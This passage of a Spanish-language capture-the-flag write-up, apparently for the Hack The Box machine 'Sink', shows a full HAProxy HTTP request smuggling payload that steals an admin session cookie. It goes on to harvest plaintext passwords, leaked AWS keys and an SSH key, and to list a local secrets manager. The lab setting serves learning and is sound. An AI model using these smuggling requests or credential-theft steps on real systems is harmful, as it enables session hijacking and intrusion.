+  <li><a href="https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142">The Powerfull HTTP Request Smuggling - medium.com/ricardoiramar</a>.</li>
+</ul>
+
+<p>Si enviamos la siguiente petición:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_versionHAProxy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<ul>
+  <li>Enviamos la data en formato <code>chunked</code> (separada por <code>\n</code> (newline)).</li>
+  <li>El total de la traza serian <code>9</code> caracteres (<code>note=hola</code>).</li>
+  <li>Con <code>0</code> le indicamos el final de la data en formato <code>chunk</code>.</li>
+</ul>
+
+<p>Obtenemos la versión concreta de <strong>HAProxy</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_res_versionHAProxy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>HAProxy Version 1.9.10</p>
+</blockquote>
+
+<p>Bueno, pues podemos enfocarnos un poco más. Quizás esta sea la ruta adecuada para la explotación. Sigamos validando si podemos explotar la web mediante el smuggling…</p>
+
+<p>En las referencias del CVE, encontramos este <strong>PoC</strong>:</p>
+
+<ul>
+  <li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">HAProxy HTTP Request Smuggling</a>.</li>
+</ul>
+
+<p>Dándole unas vueltas nos indica algo necesario para la correcta explotación:</p>
+
+<blockquote>
+  <p>The backend must also support HTTP <u>keep-alive</u>.</p>
+</blockquote>
+
+<p>Así que debemos cambiar el <strong>header</strong> <code>Connection: close</code> a <code>Connection: keep-alive</code>.</p>
+
+<p>Démosle a la locura, modifiquemos la petición incrustando otra solicitud a ver que recibimos:</p>
+
+<pre><code class="language-html">POST /notes HTTP/1.1
+Host: 10.10.10.225:5000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 259                                               &lt;!-- original --&gt;
+Origin: http://10.10.10.225:5000
+DNT: 1
+Connection: keep-alive
+Referer: http://10.10.10.225:5000/notes
+Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Transfer-Encoding: chunked
+
+9
+note=hola
+0
+
+POST /notes HTTP/1.1
+Host: 10.10.10.225:5000
+Content-Type: application/x-www-form-urlencoded                   &lt;!-- smuggling --&gt;
+Content-Length: 251
+Connection: keep-alive
+Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8
+
+note=holas
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_newPOST101010225.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y validamos el apartado <code>/notes</code>, tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes_res_newPOST101010225.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><strong>Nada :P 😂</strong></p>
+
+<p>…</p>
+
+<h2 id="final_vuln">Logramos la explotación del <u>HTTP Request Smuggling</u> <a href="#final_vuln">📌</a></h2>
+
+<p>Revisando de nuevo el post, nos dice que <u>muchas veces el </u><code>chunked</code><u> no es tomado y debemos agregarle al inicio de ese header la cadena </u><code>\x0b</code><u> (hexadecimal) </u><strong><u>para que lo interprete</u></strong>.</p>
+
+<p>Después de jugar con él, intentando agregarlo a la petición, obteníamos lo mismo. Peeeeeeero era porque lo estaba haciendo mal.</p>
+
+<p>Si pasamos el valor hexadecimal a <strong>base64</strong> externamente (nosotros mismos) y después en <strong>Burp</strong> usamos el convertidor interno de <strong>base64</strong> al valor original, ahí si logramos ver el <code>\x0b</code> reflejado:</p>
+
+<ol>
+  <li>Pasar <code>0b</code> a <strong>base64</strong>: <code>Cw==</code>.</li>
+  <li>Pegar <code>Cw==</code> en la petición, seleccionarlo y decodearlo de <strong>base64</strong> a valor original:</li>
+</ol>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_newPOST101010225_0b_1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Seleccionamos la cadena <code>Cw==</code> y hacemos:</p>
+
+<pre><code class="language-html">Clic derecho &gt; Convert-Selection &gt; Base64 &gt; Base64-decode (o de la forma corta: CTRL + SHIFT + B)
+</code></pre>
+
+<p>Y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_newPOST101010225_0b_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<pre><code class="language-html">POST /notes HTTP/1.1
+Host: 10.10.10.225:5000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded                        &lt;!-- original --&gt;
+Content-Length: 259
+Origin: http://10.10.10.225:5000
+DNT: 1
+Connection: keep-alive
+Referer: http://10.10.10.225:5000/notes
+Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Transfer-Encoding:chunked
+
+9
+note=hola
+0
+
+POST /notes HTTP/1.1
+Host: 10.10.10.225:5000
+Content-Type: application/x-www-form-urlencoded                        &lt;!-- smuggling --&gt;
+Content-Length: 251
+Connection: keep-alive
+Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8
+
+note=holas
+</code></pre>
+
+<p>Perfecto, validemos si cambia algo ahora…</p>
+
+<p>Nos genera dos notas, una esta vacía y la otra llenita :P Veamos la llenita claramente:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes_res_newPOST101010225_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Vale vale valeeeeeeeeeee, que es esta locuraaaaaaaaaaaa… Tenemos una nueva <code>cookie</code> de algún usuario (o pues al menos es diferente a la nuestra) corriendo el servicio sobre el <code>localhost</code>.</p>
+
+<p>Viendo lo que tenemos podemos intuir que esta pasando:</p>
+
+<blockquote>
+  <p>(Esto puede sonar enrredado (supongo) pero es lo que entiendo que paso)</p>
+</blockquote>
+
+<p>🚨 <strong><em>Normalmente (como vimos en las explicaciones anteriores) queremos ingresar a algún recurso al que no tengamos acceso. Como en este caso no sabemos a cuál, lo lanzamos contra el mismo recurso. Vemos que se efectúa nuestro intento, logrando así <u>interceptar la otra petición, pero obteniendo la respuesta en el mismo recurso que usamos para enviarla</u> (o sea, en <code>/notes</code>)</em></strong></p>
+
+<p>La petición es un <code>delete</code> a la nota <strong>1234</strong> (<code>/notes/delete/1234</code>) pero ejecutada desde el <code>localhost</code> por el puerto <code>8080</code> y claramente por un usuario interno, lo sabemos por qué obtenemos una <code>Cookie</code> distinta a la nuestra. Podemos usarla para cambiar la que tenemos por esa, recargar la página y ver con quien estamos (si es que cambiamos a otro usuario)…</p>
+
+<pre><code class="language-html">GET /notes/delete/1234 HTTP/1.1
+Host: 127.0.0.1:8080 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YDSQAA._g
+</code></pre>
+
+<p>Pero si notamos el tamaño de la <code>cookie</code> es más corto (la comparamos con la nuestra), agreguémosle más buffer, simplemente cambiando el valor de la cabecera a <code>Content-Length: 250</code> por ejemplo y veamos la respuesta ahora:</p>
+
+<blockquote>
+  <p>(Justo acá reiniciaron la máquina, pero pues lo unico que cambiaran seran las cookies, tanto la mia como la que obtengamos)</p>
+</blockquote>
+
+<p>La respuesta que tenemos en la nueva nota es:</p>
+
+<pre><code class="language-html">Nada ._ .
+</code></pre>
+
+<p>Si ponemos más de <strong>308</strong> como tamaño volvemos a obtener solo una nota, entonces podemos borrar el contenido de <code>note=</code> (para liberar espacio) y coloquemos <code>Content-Length: 303</code> (después de algún tanteo):</p>
+
+<pre><code class="language-html">POST /notes HTTP/1.1
+Host: 10.10.10.225:5000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 254
+Origin: http://10.10.10.225:5000
+DNT: 1
+Connection: keep-alive
+Referer: http://10.10.10.225:5000/notes
+Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDWNyg.naJPYMmG6_8HKfdGqeeJMTwjVR4
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Transfer-Encoding:chunked
+
+9
+note=hola
+0
+
+POST /notes HTTP/1.1
+Host: 10.10.10.225:5000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 303
+Connection: keep-alive
+Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDWNyg.naJPYMmG6_8HKfdGqeeJMTwjVR4
+
+note=
+</code></pre>
+
+<p>Y obtenemos ahora si en la nota:</p>
+
+<pre><code class="language-html">GET /notes/delete/1234 HTTP/1.1 
+Host: 127.0.0.1:8080 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 
+Accept-Encoding: gzip, deflate 
+Accept: */* 
+Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YDWL9A.dG5uqF6Y8oZfi7uQi3IATStQVIA 
+X-Forwarded-For: 127.0.0.1
+</code></pre>
+
+<p>Perfecto, ahora si es del tamaño adecuado :)</p>
+
+<blockquote>
+  <p>(Volvieron a reiniciar la máquina😐)</p>
+</blockquote>
+
+<p>Tomemos la cookie. Yo usare la extensión de Firefox llamada <code>Cookie-Editor</code> (que nos permite jugar con las cookies claramente :P)</p>
+
+<p>Añadimos una nueva cookie, le ponemos de nombre <code>session</code> y pegamos la cookie que encontramos y damos clic en guardar (<code>add</code>). Ahora simplemente recargamos la página y estaríamos dentro como el usuario <code>admin@sink.htb</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_changed_cookie_adminSINKhtb.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313google_gif_kidperfect.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>…</p>
+
+<h2 id="web-notes">Encontramos cositas siendo el usuario <u>admin</u> <a href="#web-notes">📌</a></h2>
+
+<p>Si revisamos las notas tenemos 3:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_admin_notes.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>El contenido de cada una es el siguiente:</p>
+
+<pre><code class="language-html">Note (1):
+
+Chef Login : http://chef.sink.htb Username : chefadm Password : /G'FEGc&amp;zEx{4]zz
+</code></pre>
+
+<pre><code class="language-html">Note (2):
+
+Dev Node URL : http://code.sink.htb Username : root Password : FaH@3I&gt;ZB})zzfO3
+</code></pre>
+
+<pre><code class="language-html">Note (3):
+
+Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : gB&gt;HGGK\{*L.f83C
+</code></pre>
+
+<p>Opa, tenemos 3 nuevas URL (una aparentemente con certificado SSL), con sus respectivos usuarios y contraseñas… Agreguémoslas al <code>/etc/hosts</code> e inspeccionemos…</p>
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.10.10.225  chef.sink.htb code.sink.htb nagios.sink.htb
+...
+</code></pre>
+
+<p>Pero al colocarlos en la web, ninguno redirecciona a ningún sitio. Y pues tiene sentido, no sabemos en qué puerto están corriendo por lo tanto no encuentra realmente lo que tiene que resolver… Pero pues tenemos credenciales y si recordamos, hay un servicio sobre el puerto <code>3000</code> (<strong>Gitea</strong>) con panel login (y en el cual uno de los usuarios era <code>root</code>), intentemos usar la contraseña que tenemos de <code>root</code> sobre ese login:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_login.png" alt="313page3000_root_login" /></p>
+
+<p>Yyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_login_done.png" alt="313page3000_root_login_done" /></p>
+
+<p>Perfecto, tamos dentro, ahoraaaaaaaaaaaaaaaaaaa a enumerar :P</p>
+
+<hr />
+
+<h2 id="gitea-root">Enumeramos el servicio <u>Gitea</u> como el usuario <u>root</u> <a href="#gitea-root">📌</a></h2>
+
+<p>Nos encontramos con <strong>4</strong> repositorios (aunque solo se vean 3 en la imagen hay <strong>4</strong>):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repos.png" alt="313page3000_root_repos" /></p>
+
+<pre><code class="language-html">'root' created repository 'root/Key_Management'
+2 months ago
+</code></pre>
+
+<p>O sea que tenemos:</p>
+
+<pre><code class="language-html">Repositorios:
+
+* Log_Management.
+* Key_Management.
+* Serverless-Plugin.
+* Kinesis_ElasticSearch.
+</code></pre>
+
+<p>Revisando cada uno, sus respectivos commits y contenido encontramos esto:</p>
+
+<ul>
+  <li>El usuario <code>marcus</code> <u>es el que hace los push (sube los cambios)</u>, <code>root</code> simplemente crea los repos.</li>
+</ul>
+
+<p><strong>Cositas relevantes de cada repo</strong>:</p>
+
+<p>…</p>
+
+<h3 id="-log_management-commits">🪕 Log_Management (commits)</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_logMan_commits.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si entramos en ese commit, tenemos el <code>access key ID</code> y la <code>secret access key</code> de <code>AWS</code> (Amazon Web Services):</p>
+
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use Aws\CloudWatchLogs\CloudWatchLogsClient;
+use Aws\Exception\AwsException;
+
+$client = new CloudWatchLogsClient([
+        'region' =&gt; 'eu',
+        'endpoint' =&gt; 'http://127.0.0.1:4566',
+        'credentials' =&gt; [
+                'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ',
+                'secret' =&gt; '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'
+        ],
+        'version' =&gt; 'latest'
+]);
+try {
+$client-&gt;createLogGroup(array(
+        'logGroupName' =&gt; 'Chef_Events',
+));
+}
+catch (AwsException $e) {
+    echo $e-&gt;getMessage();
+    echo "\n";
+}
+try {
+$client-&gt;createLogStream([
+        'logGroupName' =&gt; 'Chef_Events',
+        'logStreamName' =&gt; '20201120'
+]);
+}catch (AwsException $e) {
+    echo $e-&gt;getMessage();
+    echo "\n";
+}
+?&gt;
+</code></pre>
+
+<p>Podemos tenerlo en cuenta (además del puerto <code>4566</code> sobre el `lo), ya que en el siguiente commit esos valores son remplazados:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_logMan_commit_prepProd.png" alt="313page3000_root_repo_logMan_commit_prepProd" /></p>
+
+<p>…</p>
+
+<h3 id="-key_management-commits">🪕 Key_Management (commits)</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_keyMan_commits.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora entremos en ese commit en concreto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_keyMan_keyfound.png" alt="313page3000_root_repo_keyMan_keyfound" /></p>
+
+<p>Nos encontramos con la <strong>llave privada</strong> de un usuario (posiblemente de <code>marcus</code>) guardada en el archivo <code>.keys/dev_keys</code>.</p>
+
+<p>En el mismo commit vemos como usa la llave mediante el objeto <code>ec2.php</code>:</p>
+
+<pre><code class="language-php">&lt;?php
+
+require 'vendor/autoload.php';
+use Aws\Ec2\Ec2Client;
+
+$ec2Client = new Aws\Ec2\Ec2Client([
+    'region' =&gt; 'eu',
+    'version' =&gt; '2020-12-21',
+    'profile' =&gt; 'default',
+    'endpoint' =&gt; 'http://127.0.0.1:4566'
+]);
+
+$keyPairName = 'dev_keys';
+
+$result = $ec2Client-&gt;createKeyPair(array(
+    'KeyName' =&gt; $keyPairName
+));
+
+// Save the private key
+$saveKeyLocation = getenv('HOME') . ".keys/{$keyPairName}";
+file_put_contents($saveKeyLocation, $result['keyMaterial']);
+
+// Update the key's permissions so it can be used with SSH
+chmod($saveKeyLocation, 0600);
+</code></pre>
+
+<p>Y para pasar a producción cambian el archivo <code>dev_keys</code> por <code>prod_keys</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_keyMan_keychanged.png" alt="313page3000_root_repo_keyMan_keychanged" /></p>
+
+<p>…</p>
+
+<p>Bueno, pues probemos a copiarnos esa key, pasarla a un archivo, darle los permisos necesarios (<code>chmod 600 &lt;file&gt;</code>) e intentar acceder mediante <code>SSH</code> con alguno de los usuarios, inicialmente con <code>marcus</code> que fue el que hizo el push:</p>
+
+<blockquote>
+  <p>En los demás repos no encontre nada realmente relevante :s</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ chmod 600 dev_keys 
+❭ ssh marcus@10.10.10.225 -i dev_keys 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-53-generic x86_64)
+...
+</code></pre>
+
+<p>Yyyyy estamos dentroooooooooooooooooo:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ id
+uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
+marcus@sink:~$ ls
+user.txt
+marcus@sink:~$ ls /home
+david  git  marcus
+marcus@sink:~$
+</code></pre>
+
+<p>Niceeeeeeeeeeeeeeeeeee. LOCO LOCOOOOOOOOOOOOOOo lo del <strong>smuggling</strong>.</p>
+
+<p>Ahora si, quien sabe que nos espere :o</p>
+
+<p>…</p>
+
+<h1 id="movimiento-lateral">AWS Secrets: <u>marcus</u> -&gt; <u>david</u> <a href="#movimiento-lateral">#</a></h1>
+
+<p>Si enumeramos servicios recordamos al puerto que habíamos visto antes, el <code>4566</code>:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ netstat -l
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
+tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11          0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11-1        0.0.0.0:*               LISTEN
+tcp        0      0 localhost:34833         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11-2        0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11-3        0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11-4        0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11-5        0.0.0.0:*               LISTEN
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11-6        0.0.0.0:*               LISTEN
+tcp        0      0 localhost:4566          0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:x11-7        0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6008         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6009         0.0.0.0:*               LISTEN
+tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6010         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6011         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6012         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6014         0.0.0.0:*               LISTEN
+tcp        0      0 172.17.0.1:6015         0.0.0.0:*               LISTEN
+...
+</code></pre>
+
+<p>Además de muchos otros pero sobre una IP diferente que me recordo a <code>Docker</code>, enumeremos el servicio <code>docker</code> a ver que encontramos:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ systemctl status docker
+● docker.service - Docker Application Container Engine
+     Loaded: loaded (/lib/systemd/system/docker.service; disabled; vendor preset: enabled)
+     Active: active (running) since Wed 2021-02-24 25:25:25 UTC; 25h ago
+TriggeredBy: ● docker.socket
+       Docs: https://docs.docker.com
+   Main PID: 1487 (dockerd)
+      Tasks: 147
+     Memory: 150.5M
+     CGroup: /system.slice/docker.service
+             ├─1487 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+             ├─2225 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.18.0.2 -container-port 4566
+             ├─2313 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.2 -container-port 8080
+             ├─2363 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.3 -container-port 8080
+             ├─2394 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.4 -container-port 8080
+             ├─2447 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.5 -container-port 8080
+             ├─2502 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.6 -container-port 8080
+             ├─2552 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.7 -container-port 8080
+             ├─2594 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.8 -container-port 8080
+             ├─2642 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.9 -container-port 8080
+             ├─2682 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.10 -container-port 8080
+             ├─2740 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.11 -container-port 8080
+             ├─2780 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.12 -container-port 8080
+             ├─2844 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.13 -container-port 8080
+             ├─2873 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.14 -container-port 8080
+             ├─2907 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.15 -container-port 8080
+             ├─2953 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.16 -container-port 8080
+             └─3115 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.17 -container-port 8080
+marcus@sink:~$ 
+</code></pre>
+
+<p>Opa, vemos que esta corriendo varios contenedores, al inicio tenemos al que estamos buscando:</p>
+
+<pre><code class="language-bash">...
+├─2225 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.18.0.2 -container-port 4566
+...
+</code></pre>
+
+<p>Bien, sabemos que es un contenedor. Validemos que esta corriendo sobre él:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ curl http://localhost:4566 ; echo
+{"status": "running"}
+</code></pre>
+
+<p>Esta respuesta me acordó a la máquina:</p>
+
+<details>
+  <summary><strong>Spoiler: Nombre de la otra máquina</strong></summary>
+  
+  <code>Bucket</code>
+
+</details>
+
+<p>En la que también jugábamos con <code>AWS</code> y contenedores.</p>
+
+<p>Podemos hacer dos cosas, un <code>Remote Port Forwarding</code> (redireccionamiento de puertos) y validar con <code>nmap</code> si encontramos algo y además hacer algo de <code>fuzzing</code> para ver si hay otras rutas… O podemos volver a hablar de la máquina (<strong>del spoiler</strong>) y recordar que en el fuzzing hecho allá, obteníamos la ruta <code>/health</code> que nos sirve para validar el rendimiento y disponibilidad de los recursos de <strong>AWS</strong>.</p>
+
+<ul>
+  <li><a href="https://docs.aws.amazon.com/es_es/health/latest/ug/what-is-aws-health.html">¿Qué es AWS Health?</a></li>
+</ul>
+
+<p>Entonces podemos hacer una petición ahora junto al <code>/health</code> y ver que servicios (y su estado) esta corriendo <code>AWS</code>:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ curl http://localhost:4566/health ; echo
+{"services": {"logs": "running", "secretsmanager": "running", "kms": "running"}}
+</code></pre>
+
+<p>Perfectowowo e.e Pues tenemos 3 servicios activos y corriendo:</p>
+
+<ul>
+  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/logs/index.html">logs</a></li>
+  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/index.html">secretsmanager</a></li>
+  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/kms/index.html">kms</a></li>
+</ul>
+
+<p>Y podemos apoyarnos del <code>API</code> de <code>Amazon Web Services (aws)</code> para jugar con lo que encontramos y ver si podemos sacar algo importante:</p>
+
+<p>Probemos con <a href="https://docs.aws.amazon.com/cli/latest/reference/logs/index.html">logs</a> primero, intentemos ver la descripción de los grupos de logs creados:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ aws --endpoint-url=http://localhost:4566 --region us-east-1 logs describe-log-groups
+Unable to locate credentials. You can configure credentials by running "aws configure".
+</code></pre>
+
+<p>Si ejecutamos ese comando nos pide:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ aws configure
+AWS Access Key ID [None]:
+AWS Secret Access Key [None]:
+Default region name [None]:
+Default output format [None]:
+</code></pre>
+
+<p>Si recordamos en <code>Gitea</code> habíamos encontrado un commit que tenía esta información, busquémosla y pongámosla acá…</p>
+
+<pre><code class="language-php">...
+$client = new CloudWatchLogsClient([
+        'region' =&gt; 'eu',
+        'endpoint' =&gt; 'http://127.0.0.1:4566',
+        'credentials' =&gt; [
+                'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ',
+                'secret' =&gt; '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'
+        ],
+        'version' =&gt; 'latest'
+]);
+...
+</code></pre>
+
+<p><strong>(Aunque para comprobar el funcionamiento coloque primero cualquier valor en los dos y aun así me trajo la información, así que no es necesaria esta config (supongo))</strong></p>
+
+<pre><code class="language-bash">marcus@sink:~$ aws configure
+AWS Access Key ID [None]: asd
+AWS Secret Access Key [None]: asdfsadf
+Default region name [None]: us-east-1
+Default output format [None]: json
+</code></pre>
+
+<ul>
+  <li><a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html#cli-configure-files-where">¿Dónde se guardan las configuraciones hechas mediante <strong>AWS CLI</strong>?</a>.</li>
+</ul>
+
+<p>Y si ejecutamos de nuevo:</p>
+
+<pre><code class="language-json">marcus@sink:~$ aws --endpoint-url=http://localhost:4566 logs describe-log-groups
+{
+    "logGroups": [
+        {
+            "logGroupName": "cloudtrail",
+            "creationTime": 1614265741999,
+            "metricFilterCount": 0,
+            "arn": "arn:aws:logs:us-east-1:000000000000:log-group:cloudtrail",
+            "storedBytes": 91
+        }
+    ]
+}
+</code></pre>
+
+<p>Listones, si jugamos así con algunos parámetros podremos ir descubriendo info.</p>
+
+<p>Ahora veamos algo de <a href="https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/index.html">secretsmanager</a>:</p>
+
+<pre><code class="language-json">marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager list-secrets
+{
+    "SecretList": [
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv",
+            "Name": "Jenkins Login",
+            "Description": "Master Server to manage release cycle 1",
+            "KmsKeyId": "",
+            "RotationEnabled": false,
+            "RotationLambdaARN": "",
+            "RotationRules": {
+                "AutomaticallyAfterDays": 0
+            },
+            "Tags": [],
+            "SecretVersionsToStages": {
+                "53cf9fdf-cb47-4b35-9ba1-046bcb43cfb6": [
+                    "AWSCURRENT"
+                ]
+            }
+        },
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI",
+            "Name": "Sink Panel",
+            "Description": "A panel to manage the resources in the devnode",
+            "KmsKeyId": "",
+            "RotationEnabled": false,
+            "RotationLambdaARN": "",
+            "RotationRules": {
+                "AutomaticallyAfterDays": 0
+            },
+            "Tags": [],
+            "SecretVersionsToStages": {
+                "97d47d9b-6e95-459e-a0b4-60411a9054d2": [
+                    "AWSCURRENT"
